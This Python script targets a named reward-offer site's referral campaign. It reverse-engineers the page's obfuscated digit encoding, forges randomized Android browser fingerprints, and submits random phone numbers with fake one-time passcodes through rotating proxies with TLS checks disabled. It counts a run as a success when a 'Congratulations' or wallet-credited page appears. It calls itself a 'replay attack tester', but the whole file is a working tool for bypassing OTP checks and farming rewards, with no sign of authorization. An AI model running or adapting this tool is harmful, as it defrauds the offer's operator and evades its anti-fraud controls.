#!/usr/bin/env python3
"""
INRFlash CampINR — replay attack tester
Implements full JS _encDigits in Python.
Two-step flow: phone → OTP → congratulations.
Tests if server verifies OTP or accepts any fake digits.

Usage:
  python3 inrflash_ref.py -n 5 --delay 3
  python3 inrflash_ref.py --phone 9876543210 --otp 123456
  python3 inrflash_ref.py --test-enc
  python3 inrflash_ref.py -n 10 -p proxies.txt
"""

import base64, hashlib, json, os, random, re, string, sys, time
import requests

requests.packages.urllib3.disable_warnings()

# ═══════════════════════════════════════════════════════════════════
# _encDigits — exact mirror of the JavaScript from the HAR
# ═══════════════════════════════════════════════════════════════════

_STD = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'

def _build_pad(pd_hex):
    pad = []
    for i in range(0, len(pd_hex) - 1, 2):
        pad.append(int(pd_hex[i:i+2], 16))
    return pad

def _wire(bytes_data, ab):
    bin_str = ''.join(chr(b & 0xFF) for b in bytes_data)
    b64 = base64.b64encode(bin_str.encode('latin-1')).decode('ascii')
    out = ''
    for c in b64:
        if c == '=':
            break
        out += ab[_STD.index(c)]
    return out

def enc_digits(digits, tk, pd_hex, ab):
    digits = re.sub(r'\D', '', str(digits))
    pad = _build_pad(pd_hex)
    salt = random.randint(0, 255)
    body = [len(digits)]
    for ch in digits:
        body.append(ord(ch))
    noise_len = 6 + random.randint(0, 17)
    for _ in range(noise_len):
        body.append(random.randint(0, 255))
    raw = [salt]
    for k in range(len(body)):
        ks = (pad[k % len(pad)] ^ ord(tk[k % len(tk)]) ^ salt) & 0xFF
        raw.append((body[k] ^ ks) & 0xFF)
    return _wire(raw, ab)

# ═══════════════════════════════════════════════════════════════════
# self-test: verify _encDigits matches browser behavior
# ═══════════════════════════════════════════════════════════════════

def test_enc():
    # Known values from HAR entry 5 (_q on OTP page)
    tk = 'f02a7f46c9cde92ee11321d86079e389'
    pd = '6552af2c6541fc28299685ff434206c5e17816ce3b8a2041e40c3f8ceb3aecbf'
    ab = 'cTIJOsViC-16tpUF2HN7jGqd5zLyAblwx_98YvRMQ30ZEkouh4nrPaemSWfXDgBK'

    pad = _build_pad(pd)
    assert pad[:10] == [101, 82, 175, 44, 101, 65, 252, 40, 41, 150], 'pad mismatch'

    # Encode same number 3 times — each should be different (random salt+noise)
    results = set()
    for _ in range(10):
        r = enc_digits('123456', tk, pd, ab)
        results.add(r)
    assert len(results) > 1, 'enc_digits not random enough'

    # All output chars must be in the custom alphabet
    for r in results:
        assert all(c in ab for c in r), f'invalid char in output: {r}'

    # Encode different length numbers
    for num in ['1', '99', '123456', '9876543210']:
        r = enc_digits(num, tk, pd, ab)
        assert len(r) > 0, f'empty result for {num}'

    print('✓ _encDigits self-test passed')
    print(f'  pad length: {len(pad)}')
    print(f'  sample outputs for "123456":')
    for _ in range(5):
        print(f'    {enc_digits("123456", tk, pd, ab)}')
    print(f'  sample outputs for "9876543210":')
    for _ in range(5):
        print(f'    {enc_digits("9876543210", tk, pd, ab)}')

# ═══════════════════════════════════════════════════════════════════
# helpers
# ═══════════════════════════════════════════════════════════════════

def parse_q(html):
    m = re.search(r'var _q\s*=\s*(\{.*?\});', html)
    if not m:
        return None
    return json.loads(m.group(1))

def rand_number():
    return random.choice('6789') + ''.join(random.choices(string.digits, k=9))

def rand_otp():
    return ''.join(random.choices(string.digits, k=6))

def make_fp():
    ua = ('Mozilla/5.0 (Linux; Android 16; M2101K6P Build/BP4A.251205.006; wv) '
          'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 '
          'Chrome/150.0.7871.46 Mobile Safari/537.36')
    fp = {
        "ua": ua,
        "uaData": {
            "brands": [
                {"brand": "Not;A=Brand", "version": "8"},
                {"brand": "Chromium", "version": "150"},
                {"brand": "Android WebView", "version": "150"}
            ],
            "mobile": True, "platform": "Android"
        },
        "platform": "Linux",
        "languages": ["en-US", "en"],
        "hardwareConcurrency": random.choice([4, 6, 8]),
        "deviceMemory": random.choice([4, 6, 8]),
        "maxTouchPoints": 1, "colorDepth": 24,
        "screenWidth": random.choice([360, 393, 412]),
        "screenHeight": random.choice([780, 851, 915]),
        "availWidth": random.choice([360, 393, 412]),
        "availHeight": random.choice([740, 811, 875]),
        "timezoneOffset": -330, "timezone": "Asia/Kolkata",
        "webglVendor": "Qualcomm",
        "webglRenderer": "Adreno (TM) 730",
        "canvasHash": hashlib.md5(str(random.random()).encode()).hexdigest()[:16]
    }
    return json.dumps(fp, separators=(',', ':'))

def make_session(proxy=None):
    s = requests.Session()
    s.headers.update({
        'User-Agent': ('Mozilla/5.0 (Linux; Android 16; M2101K6P Build/BP4A.251205.006; wv) '
                       'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 '
                       'Chrome/150.0.7871.46 Mobile Safari/537.36'),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'X-Requested-With': 'mark.via.gp',
    })
    s.verify = False
    if proxy:
        s.proxies = {'http': proxy, 'https': proxy}
    return s

def clean_text(html):
    t = re.sub(r'<style[^>]*>.*?</style>', '', html, flags=re.DOTALL)
    t = re.sub(r'<script[^>]*>.*?</script>', '', t, flags=re.DOTALL)
    t = re.sub(r'<[^>]+>', ' ', t)
    return re.sub(r'\s+', ' ', t).strip()

# ═══════════════════════════════════════════════════════════════════
# main two-step flow
# ═══════════════════════════════════════════════════════════════════

def campinr_seal(s, page_url, q, action_code, value, tag=''):
    """Replicate campinrSeal() — multipart fetch + urlencoded form submit.
    Returns (final_page_text, final_url) or (None, None) on failure."""
    enc = enc_digits(value, q['tk'], q['pd'], q['ab'])
    files = {
        q['m']:  (None, '1'),
        q['tf']: (None, q['tk']),
        q['af']: (None, str(action_code)),
        q['vf']: (None, enc),
    }
    try:
        r = s.post(page_url, files=files,
                   headers={'Referer': page_url},
                   allow_redirects=False, timeout=25)
        print(f'{tag}  fetch → {r.status_code}')
    except Exception as e:
        print(f'{tag}  fetch FAIL: {e}')
        return None, None

    if r.status_code != 200:
        print(f'{tag}  unexpected status {r.status_code}')
        return None, None

    try:
        j = r.json()
        ok_key = q.get('ok', '')
        ls_key = q.get('ls', '')
        nk_key = q.get('nk', '')
        vk_key = q.get('vk', '')
        success = j.get(ok_key, 0)
        field_list = j.get(ls_key, [])
        print(f'{tag}  JSON ok={success}  fields={len(field_list)}')
    except Exception as e:
        print(f'{tag}  JSON FAIL: {e}')
        return None, None

    if not success:
        print(f'{tag}  server returned ok=0')
        return None, None

    form_data = {}
    for row in field_list:
        name = row.get(nk_key, '')
        val = row.get(vk_key, '')
        if name:
            form_data[name] = val

    if not form_data:
        print(f'{tag}  empty hidden fields')
        return None, None

    try:
        r = s.post(page_url, data=form_data,
                   headers={
                       'Content-Type': 'application/x-www-form-urlencoded',
                       'Referer': page_url,
                   },
                   allow_redirects=True, timeout=25)
        print(f'{tag}  form → {r.status_code}  → {r.url[:80]}')
    except Exception as e:
        print(f'{tag}  form FAIL: {e}')
        return None, None

    return r.text, r.url

def check_result(html, tag=''):
    if 'Congratulations' in html or 'congratulations' in html.lower():
        bt = clean_text(html)
        ci = bt.lower().find('congratul')
        print(f'{tag}  ★★★ SUCCESS: {bt[max(0,ci-30):ci+120]}')
        return 'SUCCESS'
    if 'wallet' in clean_text(html).lower() and 'credited' in clean_text(html).lower():
        print(f'{tag}  ★★★ WALLET CREDITED!')
        return 'SUCCESS'
    if 'invalid otp' in html.lower() or 'wrong otp' in html.lower():
        print(f'{tag}  ✗ INVALID OTP — server verifies')
        return 'INVALID_OTP'
    if 'expired' in html.lower():
        print(f'{tag}  ✗ EXPIRED')
        return 'EXPIRED'
    if 'already used' in html.lower():
        print(f'{tag}  ✗ IP/NUMBER ALREADY USED')
        return 'ALREADY_USED'
    if 'too many' in html.lower() or 'rate limit' in html.lower() or 'blocked' in html.lower():
        print(f'{tag}  ✗ RATE LIMITED / BLOCKED')
        return 'BLOCKED'
    for kw in ['error', 'invalid', 'wrong', 'failed', 'try again', 'something went']:
        kidx = html.lower().find(kw)
        if kidx >= 0:
            bt = clean_text(html)
            kidx2 = bt.lower().find(kw)
            if kidx2 >= 0:
                print(f'{tag}  ✗ {bt[max(0,kidx2-30):kidx2+100]}')
            else:
                print(f'{tag}  ✗ {kw} found')
            return 'ERROR'
    return None

def run_one(idx, phone=None, otp_val=None, proxy=None, verbose=False):
    phone = phone or rand_number()
    otp_val = otp_val or rand_otp()
    BASE = 'https://offers.inrflash.com'
    CAMP = f'{BASE}/camp.php?ref=XM4R&camp=campinr'
    tag = f'[{idx}]'
    print(f'{tag} phone={phone}  otp={otp_val}')

    s = make_session(proxy)

    # ── 0. GET camp.php ──
    try:
        r = s.get(CAMP, timeout=25)
        print(f'{tag}  camp GET → {r.status_code}')
    except Exception as e:
        print(f'{tag}  camp FAIL: {e}')
        return False

    # ── 1. POST _fp → redirect to offer ──
    try:
        r = s.post(CAMP, data={'_fp': make_fp()}, allow_redirects=True, timeout=25)
        offer_url = r.url
        print(f'{tag}  camp POST → {r.status_code}  → {offer_url[:80]}')
    except Exception as e:
        print(f'{tag}  camp POST FAIL: {e}')
        return False

    # ── 2. GET offer page ──
    try:
        r = s.get(offer_url, timeout=25)
        print(f'{tag}  offer GET → {r.status_code}  ({len(r.text)} bytes)')
    except Exception as e:
        print(f'{tag}  offer FAIL: {e}')
        return False

    # check immediate result
    res = check_result(r.text, tag)
    if res == 'SUCCESS':
        return True
    if res and res != 'SUCCESS':
        return False

    q = parse_q(r.text)
    if not q:
        bt = clean_text(r.text)
        print(f'{tag}  FAIL: no _q  body: {bt[:300]}')
        return False

    if verbose:
        print(f'{tag}  _q: tk={q["tk"][:20]}...')

    # ── 3. phone submit ──
    text, url = campinr_seal(s, offer_url, q, 1, phone, tag)
    if text is None:
        return False

    res = check_result(text, tag)
    if res == 'SUCCESS':
        return True
    if res and res != 'SUCCESS':
        return False

    # ── 4. GET OTP page ──
    try:
        r = s.get(url, timeout=25)
        print(f'{tag}  OTP page GET → {r.status_code}  ({len(r.text)} bytes)')
    except Exception as e:
        print(f'{tag}  OTP page FAIL: {e}')
        return False

    res = check_result(r.text, tag)
    if res == 'SUCCESS':
        return True
    if res and res != 'SUCCESS':
        return False

    q2 = parse_q(r.text)
    if not q2:
        bt = clean_text(r.text)
        print(f'{tag}  FAIL: no _q on OTP page  body: {bt[:300]}')
        return False

    # ── 5. OTP submit ──
    text2, url2 = campinr_seal(s, r.url, q2, 2, otp_val, tag)
    if text2 is None:
        return False

    res = check_result(text2, tag)
    if res == 'SUCCESS':
        return True
    if res and res != 'SUCCESS':
        return False

    # ── 6. GET final page ──
    try:
        r = s.get(url2, timeout=25)
        print(f'{tag}  final GET → {r.status_code}  ({len(r.text)} bytes)')
    except Exception as e:
        print(f'{tag}  final FAIL: {e}')
        return False

    res = check_result(r.text, tag)
    if res == 'SUCCESS':
        return True

    bt = clean_text(r.text)
    print(f'{tag}  ? UNKNOWN: {bt[:250]}')
    return False

# ═══════════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════════

def main():
    import argparse
    ap = argparse.ArgumentParser(
        description='INRFlash CampINR — tests if server accepts fake OTP')
    ap.add_argument('-n', '--count', type=int, default=1,
                    help='number of attempts')
    ap.add_argument('-p', '--proxy-file', default='',
                    help='proxy list file (one per line)')
    ap.add_argument('--phone', default='',
                    help='fixed phone number (else random)')
    ap.add_argument('--otp', default='',
                    help='fixed OTP (else random 6-digit)')
    ap.add_argument('--delay', type=float, default=2.0,
                    help='delay between attempts (seconds)')
    ap.add_argument('--test-enc', action='store_true',
                    help='run _encDigits self-test and exit')
    ap.add_argument('-v', '--verbose', action='store_true',
                    help='show extra debug info')
    args = ap.parse_args()

    if args.test_enc:
        test_enc()
        return

    proxies = []
    if args.proxy_file and os.path.exists(args.proxy_file):
        with open(args.proxy_file) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    if '://' not in line:
                        line = 'http://' + line
                    proxies.append(line)

    if proxies:
        print(f'Loaded {len(proxies)} proxies')
    else:
        print('Direct connection (no proxies)')

    stats = {'SUCCESS': 0, 'INVALID_OTP': 0, 'ERROR': 0, 'TIMEOUT': 0, 'OTHER': 0}

    for i in range(args.count):
        if i > 0:
            time.sleep(args.delay)
        proxy = proxies[i % len(proxies)] if proxies else None
        if proxy:
            print(f'  proxy → {proxy}')
        try:
            result = run_one(i, phone=args.phone or None,
                             otp_val=args.otp or None, proxy=proxy,
                             verbose=args.verbose)
            if result:
                stats['SUCCESS'] += 1
            else:
                stats['OTHER'] += 1
        except requests.exceptions.Timeout:
            print(f'[{i}] TIMEOUT')
            stats['TIMEOUT'] += 1
        except requests.exceptions.ConnectionError as e:
            print(f'[{i}] CONNECTION ERROR: {e}')
            stats['TIMEOUT'] += 1
        except KeyboardInterrupt:
            print('\nStopped.')
            break
        except Exception as e:
            print(f'[{i}] UNEXPECTED: {e}')
            stats['ERROR'] += 1

    print(f'\n{"="*50}')
    print(f'Results:')
    for k, v in stats.items():
        if v > 0:
            print(f'  {k}: {v}')
    total = sum(stats.values())
    print(f'  Total: {total}')

if __name__ == '__main__':
    main()
